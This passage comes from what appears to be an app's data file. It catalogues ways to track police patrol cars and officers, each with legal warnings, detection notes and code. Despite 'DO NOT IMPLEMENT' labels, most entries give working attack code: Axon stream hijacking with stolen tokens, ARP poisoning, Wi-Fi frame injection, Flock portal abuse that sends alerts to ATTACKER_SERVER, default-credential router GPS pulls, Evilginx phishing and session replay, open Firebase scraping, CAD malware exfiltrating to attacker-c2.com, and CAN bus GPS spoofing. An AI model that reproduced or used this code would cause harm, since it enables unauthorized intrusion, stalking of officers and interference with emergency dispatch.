    lawColor:'#FF453A', status:'FEDERAL WIRETAP',
    detectionRisk: DR.GUARANTEED,
    damagePotential: DAMAGE.MODERATE,
    detectionNote:'Cloud API logs every unauthorized request with IP, timestamp, and user-agent. Stolen JWT invalidation triggers security alert on Axon\'s backend within minutes. FBI/Axon corporate security partnership means law enforcement notification is standard procedure.',
    desc:'Axon Respond live-streams video from body cameras to a cloud dispatcher via RTMP/WebRTC over LTE. Stream is authenticated via Axon cloud API (JWT bearer tokens). All traffic goes through Axon\'s AWS infrastructure. No on-premise relay exists.',
    code:`# Step 1: capture JWT from authenticated session (MitM or stolen creds)\n# Step 2: enumerate live cameras\nGET https://api.axon.com/v1/devices?status=streaming\nAuthorization: Bearer <stolen_jwt>\n\n# Step 3: get RTMP stream URL\nGET https://api.axon.com/v1/streams/{camera_id}/url\n\n# Step 4: open stream\nffplay rtmp://stream.axon.com/live/{stream_key}`,
    why:'Every step is a separate federal crime: capturing the JWT (§2511 or §1030), calling the unauthorized API (§1030(a)(2) — exceeding authorized access), receiving the video stream (§2511(1)(a)). These stack. 3–5 federal charges per camera, per intercept.',
    invNet: false,
  },
  'ref-probe': {
    icon:'🔎', name:'Active Probe Request Injection',
    law:'FCC Part 15/97 · 18 U.S.C. §1030',
    lawColor:'#FF9F0A', status:'FRAME INJECTION',
    detectionRisk: DR.MODERATE,
    damagePotential: DAMAGE.NONE,
    detectionNote:'Low-rate probe injection with randomized MACs is harder to detect than beacons. Detection requires an active WIDS or someone running Wireshark locally. High-rate injection (PMKID harvesting at speed) becomes statistically obvious in any passive WiFi monitor.',
    desc:'Passive probe capture (what this app does) uses Scapy in sniff-only mode — zero frames transmitted. Active probe injection sends forged Dot11ProbeReq frames with spoofed MACs to trick APs into revealing hidden SSIDs, exposing PMKID for WPA handshake extraction, or mapping the authorized client list. PMKID attack: modern WPA2 APs include PMKID in RSN IE of probe responses — extractable without any client connecting.',
    code:`# Passive capture — WHAT WE DO (no transmission)\nsniff(iface="wlan0mon", prn=handler, store=0)\n\n# Active injection — DO NOT implement\nprobe = RadioTap() / Dot11(\n  type=0, subtype=4,         # 4 = probe request\n  addr1="FF:FF:FF:FF:FF:FF",\n  addr2=RandMAC(),           # randomized source MAC\n  addr3="FF:FF:FF:FF:FF:FF"\n) / Dot11ProbeReq() / Dot11Elt(ID="SSID", info="")\nsendp(probe, iface="wlan0mon", count=5)`,
    why:'Transmitting unauthorized 802.11 frames on a channel you don\'t own is an FCC Part 15 violation. If it causes an AP to reveal info it wouldn\'t have otherwise disclosed, that\'s unauthorized access (§1030). Passive listening = not illegal. Active transmission = illegal.',
    invNet: false,
    setup: [
      '🛒 Buy: Alfa AWUS036ACHM (~$35) or TP-Link TL-WN722N v1 ONLY — v2/v3 silently changed chipset and do NOT support monitor mode',
      '💻 Windows: Download Npcap from npcap.com → run installer → check "WinPcap API-compatible Mode" (critical — without this, probe capture returns nothing)',
      '🔌 Plug in the adapter and verify it shows in Device Manager → Network Adapters',
      '🐍 Install Python 3 + Scapy: pip install scapy',
      '▶️ Start the server (run_server.bat or python server.py) — it auto-configures the adapter for monitor mode on first run',
      '✅ Open Lab → Probe Requests. Devices actively searching for WiFi appear within ~10s if any are in range',
    ],
  },
  'ref-arp': {
    icon:'☠️', name:'ARP Poisoning / Man-in-the-Middle',
    law:'18 U.S.C. §2511 · §1030 · §1343',
    lawColor:'#FF453A', status:'ILLEGAL',
    detectionRisk: DR.HIGH,
    damagePotential: DAMAGE.HIGH,
    detectionNote:'Managed switches log MAC address table changes. Enterprise IDS (Snort/Suricata rule 2100369) detects gratuitous ARP replies. Cisco Dynamic ARP Inspection drops poisoned packets on configured ports. XDR/EDR on endpoints may flag sudden gateway MAC change.',
    desc:'ARP (RFC 826) has no authentication. Sending unsolicited ARP replies claiming your MAC owns the gateway IP causes all LAN hosts to forward traffic through your machine. Our app\'s ARP code sends op=1 requests to discover hosts. The attack sends op=2 replies to intercept. With IP forwarding enabled, all victim traffic is transparently forwarded while being captured. Combined with SSLStrip or Responder, plaintext credentials can be harvested.',
    code:`# Passive ARP discovery — WHAT WE DO (safe)\nsend(ARP(op=1, pdst="192.168.1.0/24"))  # request, not poisoning\n\n# ARP poisoning attack — DO NOT implement\npoison = ARP(\n  op=2,                    # 2 = reply (unsolicited)\n  pdst=victim_ip,          # tell victim...\n  hwdst=victim_mac,\n  psrc=gateway_ip,         # ...that gateway is at...\n  hwsrc=attacker_mac       # ...our MAC\n)\nsend(poison, loop=1, inter=2)  # continuously refresh`,
    why:'op=1 discovers. op=2 intercepts. One field changes the legality completely. Against an MDT: add §1362 (malicious interference with government communications) — up to 20 years.',
    invNet: true,
    invNetNote: 'ARP poisoning is a standard authorized pentesting technique. With written client authorization, it\'s how network testers intercept traffic to verify HTTPS enforcement, credential exposure, and segmentation. Invincible.Net would need an authorization-gated version.',
  },
  'ref-ios': {
    icon:'🍎', name:'iOS Browser WiFi/BLE Scanning',
    law:'NOT POSSIBLE — OS restriction',
    lawColor:'rgba(180,195,220,0.4)', status:'NOT POSSIBLE',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.NONE,
    detectionNote:'Cannot be done from a browser on iOS. Zero detection surface because zero capability.',
    desc:'Apple has never shipped Web Bluetooth on iOS. Safari, Chrome for iOS, and every other iOS browser are required by Apple to use WebKit — and WebKit explicitly rejects Web Bluetooth. There is no WiFi scan API anywhere on the web platform (Chrome/Firefox/Safari on any OS). Even if these APIs existed, iOS WebViews are suspended by the OS after ~30 seconds in background, killing any scan loop.',
    code:`// Web Bluetooth (NOT available on iOS Safari)\nconst device = await navigator.bluetooth.requestDevice({...})\n// → TypeError: navigator.bluetooth is undefined on iOS\n\n// Web NFC (NOT available on iOS)\nconst reader = new NDEFReader()\n// → ReferenceError: NDEFReader is not defined\n\n// WifiManager API (experimental, Chrome Android only, not iOS)\nnavigator.mozWifiManager  // Firefox-only, discontinued`,
    why:'This is an OS-level wall, not a bug to work around. A native iOS app with CoreBluetooth could do BLE scanning — but the web app cannot, not even close. Not illegal; just technically impossible from the browser context.',
    invNet: false,
  },
  'ref-usb': {
    icon:'🔌', name:'USB WiFi Adapter on Mobile (Monitor Mode)',
    law:'NOT VIABLE — driver fragmentation',
    lawColor:'#FF9F0A', status:'NOT VIABLE',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.HIGH,
    detectionNote:'Not illegal. Detection is purely physical — someone sees the adapter. No network-level detection since it\'s just passive sniffing.',
    desc:'Alfa AWUS036ACH, TP-Link TL-WN722N v1, and similar chipsets support monitor mode and packet injection on Linux/Windows. USB OTG to Android theoretically adds monitor-mode WiFi. In practice: phone needs USB OTG power delivery, kernel needs the exact chipset driver compiled in, app needs root or a system-level service. TP-Link WN722N v2/v3 silently changed chipset and don\'t support monitor mode at all.',
    code:`# Linux kernel module approach (Android root required)\nmodprobe 88XXau         # Realtek rtl88xxau driver\nip link set wlan1 down\niw dev wlan1 set type monitor\nip link set wlan1 up\n# Then: airmon-ng check kill && airmon-ng start wlan1\n\n# Android — no standard API for this\n# Requires: rooted device + compiled kernel module\n# + exact matching chipset version + USB 3.0 OTG hub`,
    why:'Works on rooted Android with the right chipset+kernel+adapter version — a tiny install base with constant driver fragmentation. Zero iOS support. Not worth building a brittle dependency on this hardware configuration when the Windows backend handles it cleanly.',
    invNet: false,
  },
  'ref-disassoc': {
    icon:'📻', name:'Disassociation Flood',
    law:'18 U.S.C. §1030 · §1362 · FCC',
    lawColor:'#FF453A', status:'ILLEGAL',
    detectionRisk: DR.GUARANTEED,
    damagePotential: DAMAGE.MODERATE,
    detectionNote:'Identical to deauth in terms of WIDS detection. MDK4 flood pattern (high-rate management frames across channels) is a named signature in every commercial WIDS. Devices in range immediately drop WiFi, which is a visible effect. RF fingerprint of the attacking adapter is logged.',
    desc:'Disassociation frames (802.11 subtype 0x0A) are similar to deauth but use a slightly different state machine transition. MDK3/MDK4 "mode d" floods both deauth and disassoc simultaneously across all channels, defeating channel-hopping countermeasures. In WPA3/802.11w-enabled networks, management frames are protected (PMF) and forged frames are dropped — but this doesn\'t change the legality.',
    code:`# Scapy disassoc (same pattern as deauth, DO NOT implement)\npkt = RadioTap() / Dot11(\n  type=0, subtype=10,      # 10 = disassoc (vs 12 = deauth)\n  addr1="FF:FF:FF:FF:FF:FF",\n  addr2=bssid, addr3=bssid\n) / Dot11Disas(reason=7)\n\n# MDK4 equivalent\nmdk4 wlan0mon d -b blacklist.txt -c 1,6,11`,
    why:'Same statutes as deauth: FCC intentional RF interference, CFAA §1030(a)(5) for damage to protected computers. A disassoc flood against a vehicle\'s MDT could impair a law enforcement communications system — adds §1362 on top. PMF/802.11w immunity makes frames ineffective, not legal.',
    invNet: false,
  },

  // ── Stopper tracking — advanced methods (educational reference) ────────────

  'ref-flock-portal': {
    name: 'Flock Safety Portal Exploitation',
    icon: '📷',
    status: 'ILLEGAL — CFAA §1030(a)(2) + SCA §2701',
    law: '18 U.S.C. §1030(a)(2) · Stored Communications Act §2701 · State computer crime statutes',
    lawColor: '#FF453A',
    detectionRisk: DR.GUARANTEED,
    damagePotential: DAMAGE.NONE,
    detectionNote: 'All portal logins are server-side logged with IP + timestamp. Credential theft traced within hours. Flock has a dedicated security team that monitors for abnormal "Hot List" creation. FBI is notified for ALPR network breaches — this is infrastructure targeting.',
    invNet: false,
    invNetNote: null,
    desc: 'Flock Safety operates the largest centralized ALPR (Automatic License Plate Reader) network in the US. Its "Vehicle Fingerprint" system identifies make, model, color, and plate across cameras in hundreds of jurisdictions. If a department does not mask its own patrol vehicles, they appear in the system like any other car. An unauthorized actor who gains portal access can add patrol plate numbers to a "Hot List" — turning the entire city camera network into a personal notification system that fires a real-time GPS alert every time a patrol car passes any Flock camera, even in other cities.',
    code: `# Unauthorized Flock portal access — DO NOT IMPLEMENT
# Attacker obtains credentials via phishing a smaller department
# that has "data sharing" access to a larger city's camera feed.
import requests
s = requests.Session()
s.post('https://app.flocksafety.com/api/auth/login', json={
    'email': STOLEN_EMAIL,
    'password': STOLEN_PASS,
})
# Create hot list targeting patrol vehicle plates
s.post('/api/alerts/hotlist/create', json={
    'name': 'covert watch',
    'plates': ['COPPLATE1', 'COPPLATE2'],
    'notify_method': 'webhook',
    'webhook_url': ATTACKER_SERVER,
})
# Now any Flock camera in the network → real-time lat/lng webhook`,
    why: 'Unauthorized computer access (CFAA §1030(a)(2)), interception of stored communications (SCA §2701), and state computer crime statutes. Flock is classified as critical infrastructure by many municipalities — attacks qualify for enhanced sentencing. Additionally: the "leaked location data" would be classified as law enforcement operational security, potentially adding obstruction charges.',
  },

  'ref-telematics-portal': {
    name: 'Cradlepoint / Sierra Wireless Fleet Portal',
    icon: '📡',
    status: 'ILLEGAL — CFAA §1030(a)(2)',
    law: '18 U.S.C. §1030(a)(2) · FCC Part 15 (unauthorized device access)',
    lawColor: '#FF453A',
    detectionRisk: DR.GUARANTEED,
    damagePotential: DAMAGE.NONE,
    detectionNote: 'Cloud portals (Cradlepoint NetCloud, Sierra Wireless AirLink Management) log all logins with IP, user-agent, and geolocation. Failed login attempts trigger account lockouts and security alerts within minutes. All GPS telemetry access is logged.',
    invNet: false,
    invNetNote: null,
    desc: 'Every patrol car with a Cradlepoint or Sierra Wireless router is connected to a centralized cloud management portal. Cradlepoint\'s NetCloud Manager and Sierra\'s AirLink Management Service display live GPS coordinates, speed, signal strength, and device status for every router in the fleet on one screen. Default router credentials (admin/admin, admin/password) are commonly found in the wild on older deployments. A wardriver identifies the router make/model from passive WiFi beacon parsing (vendor IE), then checks if remote management is exposed over the public internet — routers sometimes have management ports open on their cellular-side WAN IP.',
    code: `# Unauthorized fleet portal access — DO NOT IMPLEMENT
# Step 1: Identify router model from beacon (already done by passive scan)
# Step 2: Look up default credentials for that model
# Cradlepoint IBR900 default: admin / serial_number_last_8
# Sierra RV55 default: admin / admin

# Step 3: Check if remote mgmt is exposed
import requests
r = requests.get('https://{router_wan_ip}:8443/api/status/gps',
    auth=('admin', 'admin'), timeout=5, verify=False)
gps = r.json()   # → {"lat": 33.45, "lon": -112.07, "speed_mph": 42}

# Step 4: Cradlepoint NetCloud — look for exposed portals
# Google dork: site:cradlepointecm.com inurl:"/ecm/" "login"`,
    why: 'Accessing a networked device without authorization is a federal crime under CFAA §1030(a)(2) regardless of whether the device has a password. Tracking law enforcement personnel adds potential obstruction and state-level stalking charges. Routers inside vehicles are "protected computers" under federal law.',
  },

  'ref-p25-sdr': {
    name: 'P25 / DMR SDR Radio Interception',
    icon: '📻',
    status: 'GRAY ZONE — Legal for unencrypted, state-dependent',
    law: 'ECPA 18 U.S.C. §2511 (encrypted) · Most states: legal to receive unencrypted P25',
    lawColor: '#FF9F0A',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.NONE,
    detectionNote: 'Completely passive reception — no RF transmitted, no network connection. Detection surface is zero unless you are physically searched. Legal in most US states for unencrypted voice/data.',
    invNet: false,
    invNetNote: null,
    desc: 'Police dispatch communicates with vehicles via Computer-Aided Dispatch (CAD) systems over digital radio (P25 or DMR). While voice traffic is often encrypted, GPS data bursts and unit status packets are frequently transmitted unencrypted on the same channel. A $30 RTL-SDR USB dongle + free software (SDR++) can receive these packets. GPS coordinates decoded from unencrypted P25 telemetry can plot every responding unit on a private map in real-time — with zero physical proximity required. Using this method, someone at home could watch an entire department\'s fleet from their couch. The legality depends on whether the transmission is encrypted: receiving unencrypted radio (like a traditional police scanner) is generally legal in most US states. Decrypting encrypted traffic is federal wiretapping.',
    code: `# SDR P25 reception — PASSIVE ONLY, unencrypted channels only
# Hardware: RTL-SDR v3 (~$30), SMA whip antenna
# Software: SDR++, trunk-recorder, OP25 (GNU Radio block)

# 1. Find your department's P25 frequency on RadioReference.com
# 2. Lock onto control channel (RFSS)
# 3. OP25 will decode voice + data, including GPS if unencrypted

# GPS packet decode example (unencrypted P25 LCCH):
# MBT (Mobile Status Broadcast): lat/lon + unit ID + timestamp
# Decoded by OP25's meta_q / cdr handler:
#   {"unit": 4023, "lat": 33.4510, "lon": -112.0703, "ts": 1748000000}

# This is passive reception only — no frames are transmitted
# Using this for operational surveillance of officers may still be
# illegal under state laws even if reception is technically legal.`,
    why: 'Receiving unencrypted public safety radio transmissions is generally legal under federal law (and most state scanner laws) since P25 voice/data is intended to be broadcast. However: (1) using received data to actively obstruct law enforcement is a separate crime, (2) some states prohibit police scanner use while committing a crime, (3) decrypting any encrypted P25 traffic is a federal ECPA violation.',
    setup: [
      '🛒 Buy: RTL-SDR v3 dongle (~$30) from rtl-sdr.com or Amazon — comes with SMA antenna. Upgrade to discone or wideband whip for better range',
      '💾 Install SDR++ (free, Windows/Linux/Mac) from sdrpp.org — auto-detects RTL-SDR on first launch',
      '📡 Find your county P25 system at RadioReference.com → your state → your county → search for "P25" systems → note the control channel frequency',
      '🔧 Install OP25 (GNU Radio) for GPS packet extraction: github.com/boatbod/op25 — follow Linux install instructions',
      '🔧 Install Trunk Recorder for multi-channel trunked system support: github.com/robotastic/trunk-recorder',
      '▶️ Configure trunk-recorder config.json with your P25 control channel frequency and run it — decoded GPS packets appear if your jurisdiction transmits unencrypted LIP data',
    ],
  },

  'ref-phishing-cad': {
    name: 'Phishing → CAD/Fleet Dashboard Access',
    icon: '🎣',
    status: 'ILLEGAL — Computer fraud, identity theft',
    law: 'CFAA 18 U.S.C. §1030 · CAN-SPAM · State identity theft laws',
    lawColor: '#FF453A',
    detectionRisk: DR.ALMOST_CERTAIN,
    damagePotential: DAMAGE.CRITICAL,
    detectionNote: 'Phishing infrastructure (domains, hosting, email headers) is analyzed by enterprise email gateways. Once credentials are used from an unusual IP/device, the CAD system logs the anomaly and IT security gets alerted. Federal agencies treat police credential theft as critical infrastructure attack — response is fast and prosecution is certain.',
    invNet: false,
    invNetNote: null,
    desc: 'The most common attack vector into law enforcement networks. Attackers send targeted spear-phishing emails to dispatchers or officers impersonating legitimate software update requests, IT support, or court system notifications. The fake login portal captures the employee\'s credentials. With those stolen logins, the attacker can access the official CAD (Computer-Aided Dispatch) or fleet management dashboard from anywhere in the world — seeing live GPS of every patrol car, reading active call assignments, and monitoring dispatch radio traffic. Documented by FBI and CSO Online as the primary vector for police network compromises. No technical hacking skill required — just social engineering.',
    code: `# Phishing CAD credential theft — FOR REFERENCE ONLY. ILLEGAL.
# Documented by FBI (IC3), CSO Online, and multiple LE breach investigations

# Step 1: Spear-phishing email (impersonates IT dept or CAD vendor)
# Target: dispatchers, IT staff, officers with CAD access
# Lure: "Urgent: Update your CAD login credentials before Friday or lose access"
# Link: → fake-cad-update.com/login (cloned from real CAD portal)

# Step 2: Credential harvester (GoPhish / Evilginx2)
# Evilginx2 is a reverse-proxy phishing framework — captures real session tokens
# even when MFA is enabled (real-time MITM between victim and real CAD portal)
# evilginx2 -p /usr/share/evilginx/phishlets/ → configure CAD vendor phishlet

# Step 3: Stolen session reuse
# Replay the captured session cookie against real CAD portal
import requests
s = requests.Session()
s.cookies.set('session', 'STOLEN_TOKEN', domain='cad.city.gov')
fleet = s.get('https://cad.city.gov/api/units/active').json()
# → returns every patrol unit with live lat/lon, speed, heading, status`,
    why: 'All stages are federal crimes. CFAA §1030(a)(5) for unauthorized access, CAN-SPAM for the phishing email, and 18 U.S.C. §1028 for identity theft. Targeting law enforcement systems elevates charges — FBI treats police credential theft as Critical Infrastructure Protection Act violations with mandatory minimums.',
  },

  'ref-flock-camera-bypass': {
    name: 'Flock Camera Physical Compromise & Pivot',
    icon: '📸',
    status: 'ILLEGAL — Physical tampering + computer fraud',
    law: 'CFAA 18 U.S.C. §1030 · 18 U.S.C. §1030(a)(5) (damage) · State tampering',
    lawColor: '#FF453A',
    detectionRisk: DR.ALMOST_CERTAIN,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Physically accessing a Flock camera requires being on public infrastructure in view of other cameras. Flock monitors camera health — any physical access or firmware modification triggers an alert to both Flock and the subscribing agency. Tampering with public infrastructure is one of the highest-certainty arrests in this entire reference library.',
    invNet: false,
    invNetNote: null,
    desc: 'Security researchers demonstrated in 2024 (documented by EFF and YouTube security channels) that some Flock Safety cameras could be physically manipulated — pressing a specific undocumented button sequence would put them into a diagnostic mode that allowed unauthorized firmware interaction. Once a single camera is compromised, it becomes a "stepping stone" into the larger police network it\'s connected to — since all Flock cameras share a VPN-like management tunnel back to both Flock\'s cloud and the subscribing agency\'s network. A compromised edge camera can be used to pivot: port-scanning the management tunnel, exfiltrating read plate data, or injecting false plate reads. Additionally, Google Dorking finds publicly indexed Flock login pages (e.g. `inurl:flockos.com`) that can expose agency-specific portals not intended to be publicly listed.',
    code: `# Flock camera attack surface — FOR REFERENCE ONLY. ILLEGAL.
# Research disclosed: EFF Atlas of Surveillance, security researchers 2024

# Vector 1: Physical button bypass (model-dependent, patched in some firmware)
# - Camera on public pole, accessible via ladder
# - Specific button sequence → diagnostic mode → UART console on debug port
# - UART baud: 115200, no auth on some early firmware versions

# Vector 2: Google Dork enumeration (passive, legal by itself)
# inurl:flockos.com login
# inurl:flock.com/agency "sign in"
# site:*.flock.com intitle:"login"

# Vector 3: Compromised camera → network pivot (ILLEGAL)
# Camera is inside agency VPN tunnel → can scan internal network
import subprocess
# After gaining camera shell access:
# nmap -sn 10.0.0.0/24 → discovers internal fleet mgmt servers
# pivot through camera's tunnel to reach CAD server`,
    why: 'Physically accessing public infrastructure to tamper with a device is a felony under federal property statutes and state criminal mischief laws. Any subsequent computer access through the compromised device is CFAA §1030(a)(5) — "intentional damage to a protected computer." Cameras are considered part of law enforcement infrastructure in most jurisdictions, elevating standard tampering charges.',
  },

  'ref-data-broker': {
    name: 'Data Broker Exploitation (Fog Reveal / Location APIs)',
    icon: '🗄️',
    status: 'GRAY ZONE — Purchasing commercially; illegal if obtained via breach',
    law: 'Fourth Amendment (LEO use) · ECPA · State privacy laws · Varies',
    lawColor: '#FF9F0A',
    detectionRisk: DR.LOW,
    damagePotential: DAMAGE.MODERATE,
    detectionNote: 'Commercial data brokers maintain customer records. Purchasing via a fake business entity is detectable but rarely pursued for civil use. However, if a broker database is breached to obtain data, CFAA applies immediately. Law enforcement now subpoenas broker records as part of investigations — your purchase history may be discoverable.',
    invNet: false,
    invNetNote: null,
    desc: 'Companies like Fog Reveal, Babel Street, Veritone, and similar data brokers aggregate location data from thousands of smartphone apps (weather, games, coupons) without explicit user awareness. This data, purchased in bulk, provides granular movement histories for any mobile device that had any of those apps installed. Attackers (and government agencies — documented by PBS Frontline) can purchase this data commercially, or if the broker\'s database is breached, exfiltrate it. The "God\'s eye view" covers personal phones of officers (not just patrol vehicles) — revealing home addresses, personal routines, and unmarked vehicle patterns. Officers using personal phones with common apps are fully visible. Fog Reveal was specifically documented by EFF as being sold to law enforcement without warrants.',
    code: `# Data broker location data — FOR REFERENCE ONLY
# Commercial purchase (gray zone); database breach (ILLEGAL)
# Documented: PBS Frontline "The Battle for Your Data" (2022), EFF

# Commercial purchase path (legal for businesses, ethically gray):
# 1. Register an LLC as a "market research" firm
# 2. Subscribe to Fog Data Science, Babel Street, or similar API
# 3. Query by geofence (e.g., police precinct parking lot) for device history

import requests
# Hypothetical broker API call (actual endpoints vary by vendor)
resp = requests.get('https://api.brokername.com/location/history',
  params={
    'lat': 33.451, 'lon': -112.070,
    'radius_m': 500,
    'start': '2024-01-01', 'end': '2024-12-31',
    'device_type': 'all',
  },
  headers={'X-API-Key': 'VENDOR_KEY'}
)
# Returns: [{"device_id": "...", "lat": ..., "lon": ..., "ts": ..., "app": "..."}]`,
    why: 'Commercially purchasing data is legal for businesses in most states (with no warrant required). This is the EFF\'s primary concern about Fog Reveal — it creates a warrant-free surveillance path. If you obtain the data via a breach of the broker\'s database, CFAA applies. Using location data to stalk or harass law enforcement adds state stalking charges. Some states (California, Virginia, Colorado) have passed laws restricting commercial data broker sales.',
  },

  'ref-api-shadow-it': {
    name: 'Shadow IT / Third-Party API Data Leakage',
    icon: '🔗',
    status: 'GRAY ZONE — CFAA "exceeding access" test applies',
    law: 'CFAA 18 U.S.C. §1030 (circuit-split) · Van Buren v. US (2021)',
    lawColor: '#FF9F0A',
    detectionRisk: DR.MODERATE,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Automated scraping of an unsecured API will appear in server logs. If the endpoint requires no auth, you may be in a legal gray zone (Van Buren). If it requires any token or key — even a publicly visible one in the page source — using it exceeds authorized access. Any scraping at volume will trigger rate limiting or IP block.',
    invNet: false,
    invNetNote: null,
    desc: 'Modern police departments use dozens of third-party apps for scheduling, maintenance tracking, neighborhood watch systems, and community portals. These apps are approved by individual officers ("shadow IT") without formal security review. Many expose poorly-secured APIs that return raw GPS coordinates or unit status data that was supposed to be filtered before display. EFF documented cases where the "public-facing" city crime map renders filtered data on-screen, but the underlying JSON API response still contains full unfiltered patrol unit locations. A developer console (F12 → Network) reveals the raw feed URL. Similar leaks exist in apps built on Firebase/Supabase with misconfigured security rules — querying the endpoint directly returns data no end user is supposed to see.',
    code: `# Shadow IT API data leakage — FOR REFERENCE ONLY
# Research: EFF, CSO Online, multiple disclosed vulnerabilities

# Step 1: Inspect public-facing city/police app (F12 → Network tab)
# Look for XHR/fetch requests to:
#   /api/v1/units, /cad/live, /gis/units.json, /fleet/positions
# Check if the response contains MORE data than what's displayed

# Step 2: Direct API query (bypasses frontend filter)
import requests, json

# Example: Firebase Realtime Database with loose rules
firebase_url = 'https://city-cad-default-rtdb.firebaseio.com/units.json'
r = requests.get(firebase_url)  # No auth required if rules are open!
units = r.json()
for uid, unit in units.items():
    if unit.get('type') == 'patrol':
        print(f"{uid}: {unit['lat']}, {unit['lon']}, {unit['status']}")

# Example: Supabase with anon key exposed in page source
import httpx
supabase_url = 'https://PROJECT.supabase.co/rest/v1/fleet_units'
r = httpx.get(supabase_url,
  headers={'apikey': 'ANON_KEY_FROM_PAGE_SOURCE', 'Authorization': 'Bearer ANON_KEY'})`,
    why: 'After Van Buren v. United States (SCOTUS 2021), CFAA "exceeding authorized access" requires bypassing a code-based barrier — not just violating terms of service. An open API with no authentication may not trigger CFAA. But: (1) state computer fraud laws vary, (2) using any credentials (even publicly visible ones) is legally risky, (3) scraping data to track officers adds stalking/harassment charges in most states.',
  },

  'ref-malware-cad': {
    name: 'Malware / Backdoor in CAD Dispatch Workstation',
    icon: '🦠',
    status: 'ILLEGAL — Computer fraud, wiretapping, espionage statutes',
    law: 'CFAA 18 U.S.C. §1030(a)(5) · ECPA · Computer Fraud Enhancement',
    lawColor: '#FF453A',
    detectionRisk: DR.HIGH,
    damagePotential: DAMAGE.CRITICAL,
    detectionNote: 'Government workstations run EDR (Endpoint Detection & Response) software — CrowdStrike, SentinelOne, or Microsoft Defender for Government. Any reverse shell, keylogger, or persistence mechanism triggers behavioral analysis within minutes. Federal network defenders at CISA and FBI Cyber Division monitor government networks. Dwell time before detection is measured in hours, not days.',
    invNet: false,
    invNetNote: null,
    desc: 'Instead of stealing a password and logging in once, malware installed on a dispatch workstation gives permanent access. FBI and CSO Online documented cases where attackers delivered trojans via phishing emails targeting 911 dispatchers. Once on the workstation, the malware: (1) captures keystrokes and screen content — recording the real-time dispatcher view including all unit positions, (2) sets up a persistent reverse shell for ongoing access, (3) can install an automatic script that mirrors every GPS position update to an attacker-controlled server — creating a private copy of the police map. Unlike a one-time credential theft, malware provides continuous access even after a password change. Some advanced implants target CAD software APIs directly, injecting code that exfiltrates location data before it reaches the screen display layer.',
    code: `# CAD dispatch malware — FOR REFERENCE ONLY. ILLEGAL.
# Documented: FBI IC3 alerts, CSO Online government breach reporting

# Stage 1: Delivery (spear-phishing or physical USB drop)
# Payload: e.g., reverse shell + location data exfil module

# Stage 2: CAD software screen/API hooking (post-exploitation)
# Python screen capture script running as background service:
import mss, time, requests
sct = mss.mss()
while True:
    shot = sct.grab(sct.monitors[1])  # full dispatch screen
    # encode + send to attacker C2
    requests.post('https://attacker-c2.com/upload',
      data=shot.raw, timeout=5)
    time.sleep(5)

# Stage 3: CAD API siphon (if CAD software has local HTTP API)
# Poll local CAD API directly (no screen capture needed):
import requests
while True:
    units = requests.get('http://localhost:7000/api/units/active').json()
    requests.post('https://attacker-c2.com/units', json=units)
    time.sleep(10)`,
    why: 'Installing malware on a government workstation is CFAA §1030(a)(5) — intentional damage and unauthorized access to a protected computer. ECPA §2511 applies if any intercepted data includes communications content. If any federal law enforcement networks are involved, Computer Fraud Enhancement sentencing guidelines apply (5–20 year federal sentences). This is one of the most aggressively prosecuted cyber crime categories by FBI Cyber Division.',
  },

  'ref-ecu-telematics': {
    name: 'Vehicle ECU / Telematics Bus Injection & GPS Spoof',
    icon: '🚗',
    status: 'ILLEGAL — CFAA, transport security laws, obstruction',
    law: 'CFAA 18 U.S.C. §1030 · 18 U.S.C. §1030(a)(7) · Motor vehicle tampering',
    lawColor: '#FF453A',
    detectionRisk: DR.HIGH,
    damagePotential: DAMAGE.HIGH,
    detectionNote: 'Physical access to a police vehicle is required for CAN bus injection. Any hardware left in/on a vehicle risks discovery during vehicle inspection. Remote telematics exploits require finding an exposed network endpoint. Any GPS spoofing of a police vehicle is quickly noticed by dispatch when reported unit location contradicts radio comms — triggering immediate investigation.',
    invNet: false,
    invNetNote: null,
    desc: 'Police cars are "computers on wheels" — ECUs (Electronic Control Units) manage everything from engine to safety systems to GPS telemetry. Fleet management tools (PlatformScience, Verizon Connect, GPS Insight) use cellular modems to relay GPS/speed/heading to dispatch. Attack vectors documented in Indiana DOT research and Tripwire: (1) Physical CAN bus injection — connecting to the OBD-II port plants malicious frames that can read or spoof GPS telemetry being sent to the telematics modem. (2) Remote exploit — if the in-vehicle modem\'s web interface is exposed or the telematics platform has a vulnerability, an attacker can inject false GPS coordinates — making a patrol car "appear" on the dispatcher\'s map at a completely different location (GPS spoofing). (3) Infotainment system pivot — navigation systems have cellular data connections; an exploit targeting the infotainment OS can pivot to the telematics bus.',
    code: `# Vehicle ECU/telematics attack — FOR REFERENCE ONLY. ILLEGAL.
# Research: Indiana DOT telematics security study, Tripwire vehicle security

# Vector 1: OBD-II CAN bus injection (physical access required)
# python-can library — reads and injects CAN frames
import can
bus = can.interface.Bus(channel='can0', bustype='socketcan')

# Read GPS NMEA frames being transmitted over CAN to telematics modem
for msg in bus:
    if msg.arbitration_id == 0x18F00201:  # example PGN for GPS position
        lat_raw = int.from_bytes(msg.data[0:4], 'little')
        lat = (lat_raw / 1e7) - 90
        print(f"GPS: {lat:.6f}")

# Inject spoofed GPS position (makes dispatcher see car at fake location)
spoofed = can.Message(arbitration_id=0x18F00201, is_extended_id=True,
  data=[0x40, 0x4E, 0x68, 0x25, 0x60, 0x44, 0xB8, 0x12])  # fake coords
bus.send(spoofed)

# Vector 2: Remote telematics platform API injection
# If fleet management API validates input poorly:
import requests
session = requests.Session()
session.post('https://fleet.city.gov/api/auth', json={'user':'...','pass':'...'})
# Inject false position for unit P-204:
session.put('https://fleet.city.gov/api/units/P-204/position',
  json={'lat': 33.4900, 'lon': -112.0700, 'source': 'gps', 'ts': int(time.time())})`,
    why: 'Physical CAN bus access to a police vehicle requires unauthorized entry (breaking and entering). Any software installed without authorization is CFAA §1030(a)(5). GPS spoofing of emergency vehicles is a federal crime under 18 U.S.C. §1030(a)(7) — threatening damage to a protected computer. If the spoofed position causes a delayed emergency response, obstruction and potentially manslaughter charges can apply.',
  },

  'ref-radio-sdr-pipeline': {
    name: 'SDR Radio Decoding Pipeline (P25 GPS Python)',
    icon: '🎙️',
    status: 'GRAY ZONE — Legal passive reception of unencrypted signals',
    law: 'ECPA 18 U.S.C. §2511 · State scanner laws · Obstruction if misused',
    lawColor: '#FF9F0A',
    detectionRisk: DR.NA,
    damagePotential: DAMAGE.NONE,
